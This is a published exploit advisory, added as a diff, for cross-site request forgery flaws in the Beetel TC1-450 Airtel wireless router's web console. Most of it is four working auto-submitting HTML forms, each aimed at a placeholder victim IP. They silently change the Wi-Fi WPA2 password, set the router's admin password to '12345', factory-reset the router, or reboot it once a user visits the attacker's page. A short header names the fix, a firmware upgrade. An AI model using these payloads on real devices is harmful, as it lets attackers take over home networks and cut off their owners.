@@ -1,0 +1,114 @@
+# Exploit Title: Beetel TC1-450 Airtel Wireless Router - Multiple CSRF Vulnerabilities
+# Date: 12/13/2013
+# Author: SaMaN( @samanL33T )
+# Vendor Homepage:http://www.beetel.in/node/10139
+# Category: Hardware/Wireless Router
+# Firmware Version: TM4-0Q-020 and below
+# Tested on: Beetel 450-TC1 Wireless Router
+# Patch/ Fix: Upgrade to latest firmware version/ move to Beetle 450-TC2
+---------------------------------------------------
+ 
+Technical Details
+~~~~~~~~~~~~~~~~~~
+Beetel 450-TC1 Wireless Router has a Cross Site Request Forgery Vulnerability in its Web Console. Attacker can easily change Wireless password,Reboot Router, Reset Router,Change Router's Admin Password by simply making the user visit a CSRF link.
+
+Exploit Code 
+~~~~~~~~~~~~~
+
+Change Wifi (WPA2/PSK) password by CSRF
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+<html>
+<body onload="document.form.submit();">
+<form action="http://[VICTIM_IP]/Forms/home_wlan_1"
+method="POST" name="form">
+<input type="hidden" name="wlanWEBFlag" value="0">
+<input type="hidden" name="wlan_APenable" value="1">
+<input type="hidden" name="Countries_Channels" value="[Any Country]">
+<input type="hidden" name="Channel_ID" value="00000000">
+<input type="hidden" name="AdvWlan_slPower" value="High">
+<input type="hidden" name="BeaconInterval" value="100">
+<input type="hidden" name="RTSThreshold" value="2347">
+<input type="hidden" name="FragmentThreshold" value="2346">
+<input type="hidden" name="DTIM" value="1">
+<input type="hidden" name="WirelessMode" value="802.11b+g">
+<input type="hidden" name="WLSSIDIndex" value="1">
+<input type="hidden" name="ESSID_HIDE_Selection" value="0">
+<input type="hidden" name="ESSID" value="[SSID of WLAN]">
+<input type="hidden" name="WEP_Selection" value="WPA2-PSK">
+<input type="hidden" name="wlanWEPFlag" value="0">
+<input type="hidden" name="wlanGEMTEKFlag" value="0">
+<input type="hidden" name="wlanGEMTEKCMDFlag" value="0">
+<input type="hidden" name="wlanGEMTEKDeactiveAPFlag" value="0">
+<input type="hidden" name="wlanRadiusWEPFlag" value="0">
+<input type="hidden" name="TKIP_Selection" value="AES">
+<input type="hidden" name="PreSharedKey" value="[WIFI PASSWORD]">
+<input type="hidden" name="WPARekeyInter" value="0">
+<input type="hidden" name="WDSMode_Selection" value="0">
+<input type="hidden" name="WDSEncryType_Selection" value="TKIP">
+<input type="hidden" name="WDSKey" value="">
+<input type="hidden" name="WDSPeer_MAC" value="00:00:00:00:00:00">
+<input type="hidden" name="WDSPeer_MAC" value="00:00:00:00:00:00">
+<input type="hidden" name="WDSPeer_MAC" value="00:00:00:00:00:00">
+<input type="hidden" name="WDSPeer_MAC" value="00:00:00:00:00:00">
+<input type="hidden" name="WLAN_FltActive" value="0">
+<input type="hidden" name="WLAN_FltAction" value="00000000">
+<input type="hidden" name="WLANFLT_MAC" value="00:00:00:00:00:00">
+<input type="hidden" name="WLANFLT_MAC" value="00:00:00:00:00:00">
+<input type="hidden" name="WLANFLT_MAC" value="00:00:00:00:00:00">
+<input type="hidden" name="WLANFLT_MAC" value="00:00:00:00:00:00">
+<input type="hidden" name="WLANFLT_MAC" value="00:00:00:00:00:00">
+<input type="hidden" name="WLANFLT_MAC" value="00:00:00:00:00:00">
+<input type="hidden" name="WLANFLT_MAC" value="00:00:00:00:00:00">
+<input type="hidden" name="WLANFLT_MAC" value="00:00:00:00:00:00">
+<input type="hidden" name="CountryChange" value="0">
+</form>
+</body>
+</html>
+
+
+Factory Reset Router Settings by CSRF
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+<html>
+<body onload="document.form.submit();">
+<form action="http://[VICTIM_IP]/Forms/tools_system_1"
+method="POST" name="form">
+<input type="hidden" name="restoreFlag" value="1">
+<input type="hidden" name="Restart" value="RESTART">
+</form>
+</body>
+</html>
+
+
+Change Router's Admin Password by CSRF
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+<html>
+<body onload="document.form.submit();">
+<form action="http://[VICTIM_IP]/Forms/tools_admin_1"
+method="POST" name="form">
+<input type="hidden" name="uiViewTools_Password" value="12345">
+<input type="hidden" name="uiViewTools_PasswordConfirm" value="12345">
+</form>
+</body>
+</html>
+
+
+Restart Router by CSRF
+~~~~~~~~~~~~~~~~~~~~~~
+
+<html>
+<body onload="document.form.submit();">
+<form action="http://[VICTIM_IP]/Forms/tools_system_1"
+method="POST" name="form">
+<input type="hidden" name="restoreFlag" value="0">
+<input type="hidden" name="Restart" value="RESTART">
+</form>
+</body>
+</html>
+
+
+--
+SaMaN
+twitter : @samanL33T <https://twitter.com/samanL33T>
